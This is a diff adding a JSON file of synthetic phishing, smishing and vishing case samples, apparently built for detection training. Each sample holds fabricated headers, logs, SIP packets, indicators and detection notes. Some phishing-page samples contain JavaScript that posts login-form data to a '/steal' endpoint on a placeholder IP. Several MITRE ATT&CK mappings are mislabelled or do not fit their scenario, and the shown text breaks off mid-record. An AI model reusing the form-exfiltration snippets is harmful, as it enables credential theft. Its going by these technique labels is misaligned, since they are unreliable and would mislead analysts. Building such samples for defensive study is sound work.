@@ -1,0 +1,976 @@
+{
+  "samples": [
+    {
+      "scenario": "SMS phishing (smishing) campaign sends text messages impersonating a popular online payment service, containing shortened URLs that redirect to a cloned login page designed to harvest user credentials and 2FA codes.",
+      "technical_data": {
+        "sms_metadata": {
+          "message_id": "sms789654321",
+          "timestamp": "2024-05-20T09:15:32Z",
+          "sender_number": "+447700900123",
+          "spoofed_sender_id": "PayService",
+          "message_body": "Urgent: Your PayService account has been locked due to suspicious activity. Verify now: http://bit.ly/PaySecure123",
+          "url_redirection_chain": [
+            "http://bit.ly/PaySecure123",
+            "http://freewebhost.ru/payverify/login.html"
+          ],
+          "landing_page_ip": "185.199.108.153",
+          "tls_certificate": {
+            "issuer": "Let's Encrypt Authority X3",
+            "valid_from": "2024-05-18T00:00:00Z",
+            "valid_to": "2024-08-16T23:59:59Z",
+            "subject_cn": "freewebhost.ru"
+          },
+          "http_response_headers": {
+            "server": "nginx",
+            "content-security-policy": "default-src 'self'; script-src 'none';",
+            "content-type": "text/html; charset=UTF-8"
+          }
+        },
+        "domain_registration": {
+          "spoofed_domain": "freewebhost.ru",
+          "registrar": "RU-CENTER",
+          "creation_date": "2024-05-15T12:45:00Z",
+          "expiration_date": "2025-05-15T12:45:00Z",
+          "registrant_country": "RU",
+          "name_servers": [
+            "ns1.ruwebhost.ru",
+            "ns2.ruwebhost.ru"
+          ],
+          "dns_records": {
+            "A": "185.199.108.153",
+            "MX": "mx1.ruwebhost.ru"
+          }
+        },
+        "url_shortener_logs": [
+          "May 20 09:15:30 bitly-proxy[2345]: Redirect request received from +447700900123 for http://bit.ly/PaySecure123",
+          "May 20 09:15:31 bitly-proxy[2345]: Redirected to http://freewebhost.ru/payverify/login.html"
+        ],
+        "reputation_info": {
+          "sender_number_blacklist_status": {
+            "spoofed_number": "+447700900123",
+            "listed_in": [
+              "UK Spam SMS Database",
+              "Global Telephony Fraud List"
+            ],
+            "reputation_score": 3
+          },
+          "domain_blacklist_status": {
+            "domain": "freewebhost.ru",
+            "listed_in": [
+              "Spamhaus DBL",
+              "Phishing Domain List"
+            ],
+            "reputation_score": 1
+          }
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "185.199.108.153"
+        ],
+        "spoofed_sender_id": "PayService",
+        "domain": "freewebhost.ru",
+        "registrar": "RU-CENTER",
+        "sms_message_id": "sms789654321",
+        "url_shortener": "bit.ly",
+        "dns_ns": [
+          "ns1.ruwebhost.ru",
+          "ns2.ruwebhost.ru"
+        ]
+      },
+      "detection_method": "Heuristic analysis of SMS content combined with URL reputation checks; detection of use of URL shorteners redirecting to low-reputation hosting providers; correlation with domain registration age and country; monitoring sender numbers against telephony fraud blacklists and spam SMS databases; TLS certificate inspection for mismatched CN and known trusted domains.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1583.001 - Acquire Infrastructure: Domains",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1204.002 - User Execution: Malicious File"
+      ]
+    },
+    {
+      "scenario": "Spear phishing email targets individual users by masquerading as a trusted social media platform, embedding a malicious hyperlink that directs victims to a credential harvesting page hosted on a compromised legitimate website.",
+      "technical_data": {
+        "email_metadata": {
+          "message_id": "<fgh456def789@mail.example.com>",
+          "timestamp": "2024-06-05T17:42:10Z",
+          "from_address": "support@socialmedia-alerts.com",
+          "spoofed_display_name": "SocialMedia Support",
+          "subject": "Important: Account Security Alert",
+          "received_path": [
+            "mail.socialprovider.com",
+            "smtp.compromisedhost.net",
+            "victimmail.example.com"
+          ],
+          "email_headers": {
+            "Received": [
+              "from smtp.compromisedhost.net (198.51.100.99) by victimmail.example.com with ESMTPS id abcdef123456",
+              "from mail.socialprovider.com (203.0.113.89) by smtp.compromisedhost.net with ESMTP id xyz987654321"
+            ],
+            "DKIM-Signature": "v=1; a=rsa-sha256; d=socialmedia-alerts.com; s=default; bh=xyz...; b=abc...",
+            "SPF-Result": "fail",
+            "DMARC-Result": "fail"
+          },
+          "email_body_excerpt": "Dear user, we've detected unauthorized login attempts on your account. Click here to reset your password immediately: https://compromisedsite.net/login/reset?token=abcdef123456",
+          "attachment": null,
+          "embedded_links": [
+            "https://compromisedsite.net/login/reset?token=abcdef123456"
+          ],
+          "landing_page_ip": "198.51.100.99",
+          "tls_certificate": {
+            "issuer": "DigiCert Inc",
+            "valid_from": "2024-05-25T00:00:00Z",
+            "valid_to": "2025-05-25T23:59:59Z",
+            "subject_cn": "compromisedsite.net"
+          }
+        },
+        "domain_registration": {
+          "spoofed_domain": "compromisedsite.net",
+          "registrar": "NameCheap, Inc.",
+          "creation_date": "2018-11-12T10:30:00Z",
+          "expiration_date": "2025-11-12T10:30:00Z",
+          "registrant_country": "US",
+          "name_servers": [
+            "ns1.namecheaphosting.com",
+            "ns2.namecheaphosting.com"
+          ],
+          "dns_records": {
+            "A": "198.51.100.99",
+            "MX": "mail.compromisedsite.net"
+          }
+        },
+        "email_reputation": {
+          "sending_ip_blacklist_status": {
+            "ip": "203.0.113.89",
+            "listed_in": [
+              "Spamhaus SBL",
+              "SpamCop"
+            ],
+            "reputation_score": 2
+          },
+          "domain_blacklist_status": {
+            "domain": "socialmedia-alerts.com",
+            "listed_in": [
+              "Phishing Domain List"
+            ],
+            "reputation_score": 1
+          }
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "198.51.100.99",
+          "203.0.113.89"
+        ],
+        "spoofed_email_display_name": "SocialMedia Support",
+        "from_email": "support@socialmedia-alerts.com",
+        "domain": "compromisedsite.net",
+        "registrar": "NameCheap, Inc.",
+        "email_message_id": "<fgh456def789@mail.example.com>",
+        "dns_ns": [
+          "ns1.namecheaphosting.com",
+          "ns2.namecheaphosting.com"
+        ]
+      },
+      "detection_method": "Email gateway filters applying SPF, DKIM and DMARC validation with fail detection; reputation checks on sending IPs and domains; heuristic link analysis to detect redirection to compromised legitimate domains; sandboxing of email content to identify credential harvesting forms; user behavior analytics to detect unusual account access requests.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1583.001 - Acquire Infrastructure: Domains",
+        "T1204.001 - User Execution: Malicious Link",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "SMS phishing (smishing) campaign sends text messages impersonating a well-known payment service, instructing victims to click a shortened URL leading to a credential harvesting site with TLS encryption to appear legitimate.",
+      "technical_data": {
+        "sms_metadata": {
+          "message_id": "sms789xyz456abc",
+          "timestamp": "2024-05-20T09:15:33Z",
+          "sender_number": "+447700900123",
+          "spoofed_sender_name": "PaySvcHelp",
+          "recipient_number": "+447700900999",
+          "message_content": "Alert: Your PayService account has been locked due to suspicious activity. Verify now: https://bit.ly/payverify123",
+          "url_redirect_chain": [
+            "https://bit.ly/payverify123",
+            "https://secure-payservice.com.verify-user.login/confirm"
+          ],
+          "tls_certificate": {
+            "issuer": "Let's Encrypt Authority X3",
+            "valid_from": "2024-05-01T00:00:00Z",
+            "valid_to": "2024-08-01T23:59:59Z",
+            "subject": "secure-payservice.com.verify-user.login"
+          },
+          "hosting_ip": "192.0.2.45",
+          "web_server_logs": [
+            "May 20 09:15:35 websrv01 nginx[2345]: 192.0.2.100 - - [20/May/2024:09:15:35 +0000] \"GET /verify HTTP/1.1\" 200 5321 \"https://bit.ly/payverify123\" \"Mozilla/5.0 (Linux; Android 10)\"",
+            "May 20 09:16:01 websrv01 nginx[2345]: 192.0.2.100 - - [20/May/2024:09:16:01 +0000] \"POST /login HTTP/1.1\" 302 - \"-\" \"Mozilla/5.0 (Linux; Android 10)\""
+          ],
+          "dns_records": {
+            "A": "192.0.2.45",
+            "TXT": "v=spf1 include:_spf.fakehost.com ~all"
+          }
+        },
+        "domain_registration": {
+          "spoofed_domain": "secure-payservice.com.verify-user.login",
+          "registrar": "FakeDomainRegistrar Ltd",
+          "creation_date": "2024-05-01T05:30:00Z",
+          "expiration_date": "2025-05-01T05:30:00Z",
+          "registrant_country": "CN",
+          "name_servers": [
+            "ns1.fakehost.cn",
+            "ns2.fakehost.cn"
+          ]
+        },
+        "phone_number_blacklist_status": {
+          "spoofed_number": "+447700900123",
+          "listed_in": [
+            "SMS Spam Database",
+            "Telephony Fraud Database"
+          ],
+          "reputation_score": 3
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "192.0.2.45",
+          "192.0.2.100"
+        ],
+        "spoofed_sender_name": "PaySvcHelp",
+        "domain": "secure-payservice.com.verify-user.login",
+        "registrar": "FakeDomainRegistrar Ltd",
+        "dns_ns": [
+          "ns1.fakehost.cn",
+          "ns2.fakehost.cn"
+        ],
+        "url_shortener": "bit.ly"
+      },
+      "detection_method": "Analysis of SMS message metadata and URL resolution revealing suspicious redirect chains; TLS certificate inspection showing mismatch in domain legitimacy; correlation of domain registration info indicating recent creation with registrant in high-risk country; phone number reputation checks flagging sender; monitoring web server logs for credential harvesting POST requests from diverse IPs.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1588.001 - Obtain Capabilities: Acquire Infrastructure",
+        "T1589.002 - Gather Victim Identity Information: Credentials",
+        "T1204.002 - User Execution: Malicious File",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Email phishing campaign sends spoofed messages appearing from a trusted cloud storage provider, using a compromised legitimate SMTP server to bypass SPF and DKIM checks, tricking users into opening an attached macro-enabled document that installs a remote access trojan.",
+      "technical_data": {
+        "email_metadata": {
+          "message_id": "<20240522.123456@examplemail.com>",
+          "timestamp": "2024-05-22T14:45:12Z",
+          "from_address": "support@cloudstorage.com",
+          "spoofed_display_name": "CloudStorage Support",
+          "to_address": "victim@example.org",
+          "subject": "Important: Account Security Update Required",
+          "email_headers": {
+            "Received": [
+              "from smtp-legit.example.net (203.0.113.100) by mail.example.org with ESMTP id abc123def456",
+              "from unknown (HELO unknown) (198.51.100.77) by smtp-legit.example.net with SMTP id xyz789ghi012"
+            ],
+            "SPF": "pass (smtp-legit.example.net: domain of cloudstorage.com designates 203.0.113.100 as permitted sender)",
+            "DKIM": "pass (signature verified)",
+            "DMARC": "none"
+          },
+          "email_body_excerpt": "Dear user, to ensure your data security, please open the attached document, enable macros, and follow the instructions.",
+          "attachment": {
+            "filename": "SecurityUpdate.docm",
+            "file_hash_sha256": "d3c4e58a5f4d7b8e9123456789abcdef1234567890abcdef1234567890abcdef",
+            "file_size_bytes": 154321,
+            "attachment_type": "Macro-enabled Word Document"
+          },
+          "smtp_server_logs": [
+            "May 22 14:44:58 smtp-legit.example.net postfix/smtpd[2345]: connect from unknown[198.51.100.77]",
+            "May 22 14:45:00 smtp-legit.example.net postfix/smtpd[2345]: NOQUEUE: reject: RCPT from unknown[198.51.100.77]: 554 5.7.1 <victim@example.org>: Relay access denied",
+            "May 22 14:45:05 smtp-legit.example.net postfix/smtpd[2345]: 1234ABCD: client=unknown[198.51.100.77]",
+            "May 22 14:45:10 smtp-legit.example.net postfix/qmgr[6789]: 1234ABCD: from=<support@cloudstorage.com>, size=172345, nrcpt=1 (queue active)"
+          ],
+          "network_packet_capture_excerpt": [
+            "No.     Time           Source               Destination          Protocol Length Info",
+            "23456  14:45:05.234   198.51.100.77        203.0.113.100        SMTP     600    EHLO unknown",
+            "23457  14:45:06.125   203.0.113.100        198.51.100.77        SMTP     240    250 OK",
+            "23458  14:45:07.000   198.51.100.77        203.0.113.100        SMTP     1200   DATA",
+            "23459  14:45:10.000   203.0.113.100        198.51.100.77        SMTP     250    250 OK id=1234ABCD"
+          ]
+        },
+        "domain_registration": {
+          "spoofed_domain": "cloudstorage.com",
+          "registrar": "LegitRegistrar Inc",
+          "creation_date": "2010-02-15T12:00:00Z",
+          "expiration_date": "2025-02-15T12:00:00Z",
+          "registrant_country": "US",
+          "name_servers": [
+            "ns1.cloudstorage.com",
+            "ns2.cloudstorage.com"
+          ],
+          "dns_records": {
+            "A": "203.0.113.200",
+            "MX": "smtp.cloudstorage.com"
+          }
+        },
+        "smtp_server_reputation": {
+          "smtp_server_ip": "203.0.113.100",
+          "reputation_score": 85,
+          "is_compromised": true,
+          "known_abuse_reports": [
+            "2024-05-15: Used in phishing campaign targeting financial institutions",
+            "2024-05-20: Detected sending macro-enabled document attachments"
+          ]
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "198.51.100.77",
+          "203.0.113.100"
+        ],
+        "from_address": "support@cloudstorage.com",
+        "domain": "cloudstorage.com",
+        "registrar": "LegitRegistrar Inc",
+        "dns_ns": [
+          "ns1.cloudstorage.com",
+          "ns2.cloudstorage.com"
+        ],
+        "attachment_hash": "d3c4e58a5f4d7b8e9123456789abcdef1234567890abcdef1234567890abcdef"
+      },
+      "detection_method": "Correlation of SMTP logs showing connection from unusual IP (198.51.100.77) to legitimate SMTP server; detection of macro-enabled attachments in emails originating from compromised SMTP server; SPF and DKIM pass but anomalous DMARC policy; reputation scoring of SMTP IP indicating recent compromise; attachment hash checked against threat intelligence databases revealing known trojan; user reports of suspicious document execution.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1193 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1071.001 - Application Layer Protocol: Web Protocols (SMTP)",
+        "T1105 - Ingress Tool Transfer"
+      ]
+    },
+    {
+      "scenario": "Phishing website impersonates a popular online payment service to harvest login credentials and two-factor authentication codes by presenting a fake login page and intercepting submitted data.",
+      "technical_data": {
+        "web_server_logs": [
+          "2024-05-02T11:15:22Z 198.51.100.101 GET /signin HTTP/1.1 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+          "2024-05-02T11:15:30Z 198.51.100.101 POST /signin HTTP/1.1 302 - Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+          "2024-05-02T11:15:30Z 198.51.100.101 POST /2fa/verify HTTP/1.1 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        ],
+        "html_source_excerpt": "<form action=\"/signin\" method=\"POST\">\n  <input type=\"text\" name=\"username\" placeholder=\"Email or phone\">\n  <input type=\"password\" name=\"password\" placeholder=\"Password\">\n  <button type=\"submit\">Log In</button>\n</form>",
+        "redirect_chain": [
+          "https://secure-payments-login.com/signin",
+          "https://secure-payments-login.com/2fa",
+          "https://secure-payments-login.com/dashboard"
+        ],
+        "domain_registration": {
+          "spoofed_domain": "secure-payments-login.com",
+          "registrar": "NameCheap, Inc.",
+          "creation_date": "2024-04-28T09:07:00Z",
+          "expiration_date": "2025-04-28T09:07:00Z",
+          "registrant_country": "CN",
+          "name_servers": [
+            "ns1.namecheapdns.com",
+            "ns2.namecheapdns.com"
+          ],
+          "dns_records": {
+            "A": "198.51.100.101",
+            "MX": "mail.secure-payments-login.com"
+          }
+        },
+        "ip_reputation": {
+          "ip": "198.51.100.101",
+          "blacklist_status": [
+            "Spamhaus",
+            "Phishing Domain List"
+          ],
+          "reputation_score": 3
+        },
+        "ssl_certificate": {
+          "issuer": "Let's Encrypt Authority X3",
+          "valid_from": "2024-04-28T09:10:00Z",
+          "valid_to": "2024-07-27T09:10:00Z",
+          "subject": "CN=secure-payments-login.com"
+        },
+        "captured_phishing_data_sample": {
+          "username": "victim@example.com",
+          "password": "P@ssw0rd123",
+          "2fa_code": "482915"
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "198.51.100.101"
+        ],
+        "spoofed_domain": "secure-payments-login.com",
+        "registrar": "NameCheap, Inc.",
+        "dns_ns": [
+          "ns1.namecheapdns.com",
+          "ns2.namecheapdns.com"
+        ],
+        "ssl_certificate_subject": "CN=secure-payments-login.com"
+      },
+      "detection_method": "Automated domain reputation checks combined with SSL certificate validation and monitoring of login form submissions on non-official domains; anomaly detection on IP addresses with poor reputation; correlation with phishing URL databases; user agent and behavior analytics on suspicious login patterns.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1588.001 - Obtain Capabilities: Phishing",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1204.002 - User Execution: Malicious File",
+        "T1598.002 - Phishing: Spearphishing via Service"
+      ]
+    },
+    {
+      "scenario": "Spearphishing email containing a malicious link to a cloned corporate intranet portal designed to capture employee credentials and session cookies for lateral movement.",
+      "technical_data": {
+        "email_headers": {
+          "from": "it-support@corp-secure.com",
+          "to": "employee@victimcorp.com",
+          "subject": "Urgent: Password Reset Required",
+          "received": [
+            "from mail.spamhost.ru (198.51.100.45) by mail.victimcorp.com with ESMTPS id 1234ABCD",
+            "for <employee@victimcorp.com>; Wed, 15 May 2024 09:32:11 +0000"
+          ],
+          "spf_pass": false,
+          "dkim_pass": false,
+          "dmarc_pass": false
+        },
+        "email_body_excerpt": "Dear Employee,\n\nDue to recent security updates, you are required to reset your password immediately by clicking the link below:\n\nhttps://portal-victimcorp-secure.com/login\n\nFailure to comply will result in account suspension.\n\nRegards,\nIT Support Team",
+        "malicious_url": {
+          "url": "https://portal-victimcorp-secure.com/login",
+          "ip_address": "198.51.100.45",
+          "tls_certificate": {
+            "issuer": "Comodo CA Limited",
+            "valid_from": "2024-05-10T05:00:00Z",
+            "valid_to": "2025-05-10T05:00:00Z",
+            "subject": "CN=portal-victimcorp-secure.com"
+          },
+          "domain_registration": {
+            "spoofed_domain": "portal-victimcorp-secure.com",
+            "registrar": "GoDaddy.com, LLC",
+            "creation_date": "2024-05-08T14:22:00Z",
+            "expiration_date": "2025-05-08T14:22:00Z",
+            "registrant_country": "RU",
+            "name_servers": [
+              "ns1.godaddydns.com",
+              "ns2.godaddydns.com"
+            ],
+            "dns_records": {
+              "A": "198.51.100.45",
+              "MX": "mail.portal-victimcorp-secure.com"
+            }
+          }
+        },
+        "captured_credentials_sample": {
+          "username": "employee@victimcorp.com",
+          "password": "Emp!oy33P@ssw0rd"
+        },
+        "network_traffic_logs": [
+          "May 15 09:32:15 firewall1 kernel: IN=eth0 OUT= MAC=00:0c:29:3e:5b:6d SRC=203.0.113.75 DST=198.51.100.45 LEN=1500 TOS=0x00",
+          "May 15 09:32:17 proxy server: CONNECT portal-victimcorp-secure.com:443 - 198.51.100.45 - ALLOWED",
+          "May 15 09:32:22 proxy server: POST /login 302 198.51.100.45"
+        ]
+      },
+      "indicators": {
+        "ip_addresses": [
+          "198.51.100.45",
+          "203.0.113.75"
+        ],
+        "spoofed_domain": "portal-victimcorp-secure.com",
+        "registrar": "GoDaddy.com, LLC",
+        "dns_ns": [
+          "ns1.godaddydns.com",
+          "ns2.godaddydns.com"
+        ],
+        "email_from": "it-support@corp-secure.com",
+        "tls_certificate_subject": "CN=portal-victimcorp-secure.com"
+      },
+      "detection_method": "Email gateway scanning for SPF/DKIM/DMARC failures coupled with URL reputation analysis; heuristic detection of domain spoofing with newly registered domains mimicking corporate assets; sandboxing of clicked URLs and credential submission monitoring; network proxy logs analysis for anomalous destination IPs and domain names.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1588.001 - Obtain Capabilities: Phishing",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1192 - Spearphishing Link",
+        "T1098 - Account Manipulation"
+      ]
+    },
+    {
+      "scenario": "A phishing email campaign directs victims to a fraudulent e-commerce site mimicking a popular online retailer to steal credit card details and login credentials. The phishing site uses SSL certificates obtained from a free certificate authority to appear legitimate.",
+      "technical_data": {
+        "email_headers": {
+          "from": "support@amaz0n-secure.com",
+          "received_path": [
+            "mail.phishingsite.net",
+            "smtp-relay.free-email.com"
+          ],
+          "subject": "Urgent: Verify your Amazon account for recent suspicious activity",
+          "message_id": "<20240416123045.abc123@mail.phishingsite.net>",
+          "dkim_signature": "pass",
+          "spf_result": "fail",
+          "dmarc_result": "fail"
+        },
+        "phishing_website_details": {
+          "url": "https://amaz0n-secure.com/login",
+          "ssl_certificate": {
+            "issuer": "Let's Encrypt Authority X3",
+            "valid_from": "2024-04-12T00:00:00Z",
+            "valid_to": "2024-07-11T23:59:59Z",
+            "subject_common_name": "amaz0n-secure.com"
+          },
+          "hosting_ip": "192.0.2.45",
+          "web_server": "Apache/2.4.52 (Unix)",
+          "javascript_snippet": "document.getElementById('loginForm').onsubmit = function() { fetch('https://192.0.2.45/steal', {method:'POST', body: new FormData(this)}); return true; };",
+          "login_form_fields": [
+            "email",
+            "password",
+            "2fa_code"
+          ],
+          "redirect_after_submit": "https://amazon.com/account/security-alert"
+        },
+        "domain_registration": {
+          "spoofed_domain": "amaz0n-secure.com",
+          "registrar": "NameCheap, Inc.",
+          "creation_date": "2024-04-10T14:15:00Z",
+          "expiration_date": "2025-04-10T14:15:00Z",
+          "registrant_country": "CN",
+          "name_servers": [
+            "ns1.namecheaphosting.com",
+            "ns2.namecheaphosting.com"
+          ],
+          "dns_records": {
+            "A": "192.0.2.45",
+            "MX": "mail.amaz0n-secure.com"
+          }
+        },
+        "ip_reputation": {
+          "ip_address": "192.0.2.45",
+          "blacklists": [
+            "Spamhaus",
+            "PhishTank"
+          ],
+          "reputation_score": 15
+        }
+      },
+      "indicators": {
+        "email_from": "support@amaz0n-secure.com",
+        "phishing_url": "https://amaz0n-secure.com/login",
+        "ssl_issuer": "Let's Encrypt Authority X3",
+        "hosting_ip": "192.0.2.45",
+        "domain_registrar": "NameCheap, Inc.",
+        "dns_ns": [
+          "ns1.namecheaphosting.com",
+          "ns2.namecheaphosting.com"
+        ],
+        "blacklisted_ip": "192.0.2.45"
+      },
+      "detection_method": "Email gateway analysis detecting SPF and DMARC failures despite valid DKIM; anomaly detection on domains visually similar to trusted e-commerce sites; SSL certificate checks for recently issued certs from free CAs; IP reputation scoring and blacklist checks; content inspection for JavaScript exfiltration routines; user reports of credential theft.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1598.001 - Phishing: Spearphishing via Service",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1587.001 - Develop Capabilities: Spearphishing"
+      ]
+    },
+    {
+      "scenario": "A targeted phishing campaign leveraging SMS text messages (smishing) sends a link to a fake social media login page designed to capture victim credentials. The phishing domain uses fast-flux DNS techniques to rapidly change IP addresses to evade takedown.",
+      "technical_data": {
+        "sms_message_metadata": {
+          "sms_id": "smshack-20240416-4578",
+          "timestamp": "2024-04-16T09:45:30Z",
+          "sender_number": "+447700900123",
+          "message_content": "Alert: Your Facebook account will be locked unless you verify now: http://fb-verify-login.com/login",
+          "recipient_number": "+447700900999"
+        },
+        "phishing_website_details": {
+          "url": "http://fb-verify-login.com/login",
+          "hosting_ips": [
+            "198.51.100.101",
+            "198.51.100.102",
+            "198.51.100.103"
+          ],
+          "dns_fastflux_behavior": {
+            "ttl_seconds": 60,
+            "ip_rotation_interval_seconds": 45,
+            "dns_query_log_sample": [
+              {
+                "timestamp": "2024-04-16T09:45:00Z",
+                "response_ips": [
+                  "198.51.100.101",
+                  "198.51.100.102"
+                ]
+              },
+              {
+                "timestamp": "2024-04-16T09:45:45Z",
+                "response_ips": [
+                  "198.51.100.102",
+                  "198.51.100.103"
+                ]
+              },
+              {
+                "timestamp": "2024-04-16T09:46:30Z",
+                "response_ips": [
+                  "198.51.100.101",
+                  "198.51.100.103"
+                ]
+              }
+            ]
+          },
+          "ssl_certificate": null,
+          "web_server": "nginx/1.18.0",
+          "login_form_fields": [
+            "email",
+            "password"
+          ],
+          "javascript_snippet": "document.getElementById('loginForm').addEventListener('submit', function(e){ e.preventDefault(); fetch('http://198.51.100.101/steal', {method:'POST',body:new FormData(this)}); alert('Verification failed, please try again'); });"
+        },
+        "domain_registration": {
+          "spoofed_domain": "fb-verify-login.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2024-04-14T16:00:00Z",
+          "expiration_date": "2025-04-14T16:00:00Z",
+          "registrant_country": "UA",
+          "name_servers": [
+            "ns1.fastflux-dns.net",
+            "ns2.fastflux-dns.net"
+          ],
+          "dns_records": {
+            "A": [
+              "198.51.100.101",
+              "198.51.100.102",
+              "198.51.100.103"
+            ]
+          }
+        },
+        "ip_reputation": {
+          "ip_addresses": [
+            "198.51.100.101",
+            "198.51.100.102",
+            "198.51.100.103"
+          ],
+          "blacklists": [
+            "Spamhaus",
+            "AbuseIPDB"
+          ],
+          "reputation_score": 10
+        }
+      },
+      "indicators": {
+        "sms_sender_number": "+447700900123",
+        "phishing_url": "http://fb-verify-login.com/login",
+        "dns_ns": [
+          "ns1.fastflux-dns.net",
+          "ns2.fastflux-dns.net"
+        ],
+        "fastflux_ip_pool": [
+          "198.51.100.101",
+          "198.51.100.102",
+          "198.51.100.103"
+        ],
+        "domain_registrar": "GoDaddy.com, LLC"
+      },
+      "detection_method": "Network DNS monitoring spotting low TTL and frequent IP changes (fast-flux behavior); SMS gateway filtering flagged suspicious sender numbers; correlation of domain registration metadata with known malicious registrars and registrant countries; IP reputation checks and blacklist alerts; behavioral analysis of JavaScript exfiltration; user reports from social media platforms.",
+      "relevant_mitre_techniques": [
+        "T1566.003 - Phishing: Spearphishing via Service",
+        "T1598.003 - Phishing: Spearphishing via Social Media",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1606 - Forge Web Credentials",
+        "T1583.001 - Acquire Infrastructure: Domains"
+      ]
+    },
+    {
+      "scenario": "Voice phishing (vishing) call impersonates an insurance company to trick victims into revealing social security numbers and policy details by spoofing the official customer service number and routing calls through a compromised SIP trunk provider.",
+      "technical_data": {
+        "call_recording_metadata": {
+          "call_id": "def456uvw123",
+          "timestamp": "2024-05-02T09:15:33Z",
+          "duration_seconds": 278,
+          "caller_id_spoofed": "+1-877-INSURE-9",
+          "actual_call_origin_ip": "198.51.101.45",
+          "voip_gateway_ip": "203.0.114.87",
+          "sip_invite_packet": "INVITE sip:+18774678739@insurancecorp.com SIP/2.0\r\nVia: SIP/2.0/UDP 203.0.114.87:5060;branch=z9hG4bK-987654321-xyztuv123456\r\nFrom: \"Insurance Support\" <sip:support@insurancecorp.com>;tag=654321987\r\nTo: <sip:+18774678739@insurancecorp.com>\r\nCall-ID: def456uvw123@203.0.114.87\r\nCSeq: 1 INVITE\r\nContact: <sip:fraudster@203.0.114.87:5060>\r\nContent-Type: application/sdp\r\nContent-Length: 144\r\n\r\nv=0\r\no=- 1580000000000 1580000000000 IN IP4 203.0.114.87\r\ns=Vishing Insurance Call\r\nc=IN IP4 203.0.114.87\r\nt=0 0\r\nm=audio 49200 RTP/AVP 0\r\na=rtpmap:0 PCMU/8000",
+          "sip_response_200_ok": "SIP/2.0 200 OK\r\nVia: SIP/2.0/UDP 203.0.114.87:5060;branch=z9hG4bK-987654321-xyztuv123456\r\nFrom: \"Insurance Support\" <sip:support@insurancecorp.com>;tag=654321987\r\nTo: <sip:+18774678739@insurancecorp.com>;tag=198765\r\nCall-ID: def456uvw123@203.0.114.87\r\nCSeq: 1 INVITE\r\nContact: <sip:+18774678739@insurancecorp.com>\r\nContent-Length: 0",
+          "voice_transcript_excerpt": "Good morning, this is Insurance Support calling regarding a claim you submitted. We need to verify your social security number and policy ID to proceed with processing.",
+          "voip_gateway_logs": [
+            "May 02 09:15:33 voip-gw02 sipproxy[2345]: INVITE from 203.0.114.87 to +18774678739 allowed by ACL",
+            "May 02 09:15:40 voip-gw02 sipproxy[2345]: RTP stream established between 203.0.114.87 and 198.51.101.45",
+            "May 02 09:20:11 voip-gw02 sipproxy[2345]: Call terminated by remote party"
+          ],
+          "network_packet_capture_excerpt": [
+            "No.     Time           Source                Destination           Protocol Length Info",
+            "23456  09:15:33.101   203.0.114.87           198.51.101.45          SIP      562    INVITE sip:+18774678739@insurancecorp.com SIP/2.0",
+            "23457  09:15:33.103   198.51.101.45          203.0.114.87           SIP      230    SIP/2.0 100 Trying",
+            "23458  09:15:33.250   198.51.101.45          203.0.114.87           SIP      310    SIP/2.0 180 Ringing",
+            "23459  09:15:34.000   198.51.101.45          203.0.114.87           SIP      395    SIP/2.0 200 OK",
+            "23460  09:15:34.050   203.0.114.87           198.51.101.45          ACK      200    ACK"
+          ]
+        },
+        "caller_id_spoofing_technique": "SIP INVITE header forged to display +1-877-467-8739, the legitimate insurance company customer service number, while the actual SIP signaling and RTP streams originate from a compromised SIP trunk provider with IP 203.0.114.87.",
+        "domain_registration": {
+          "spoofed_domain": "insurancecorp-support.net",
+          "registrar": "SafeDomain Services",
+          "creation_date": "2024-04-28T15:45:00Z",
+          "expiration_date": "2025-04-28T15:45:00Z",
+          "registrant_country": "CN",
+          "name_servers": [
+            "ns1.safedomain.cn",
+            "ns2.safedomain.cn"
+          ],
+          "dns_records": {
+            "A": "203.0.114.87",
+            "MX": "mail.safedomain.cn"
+          }
+        },
+        "phone_number_blacklist_status": {
+          "spoofed_number": "+18774678739",
+          "listed_in": [
+            "Telephony Fraud Database",
+            "Spam Call Blocklist"
+          ],
+          "reputation_score": 3
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "203.0.114.87",
+          "198.51.101.45"
+        ],
+        "spoofed_caller_id": "+1-877-INSURE-9",
+        "domain": "insurancecorp-support.net",
+        "registrar": "SafeDomain Services",
+        "voip_sip_call_id": "def456uvw123",
+        "suspicious_sip_branch": "z9hG4bK-987654321-xyztuv123456",
+        "dns_ns": [
+          "ns1.safedomain.cn",
+          "ns2.safedomain.cn"
+        ]
+      },
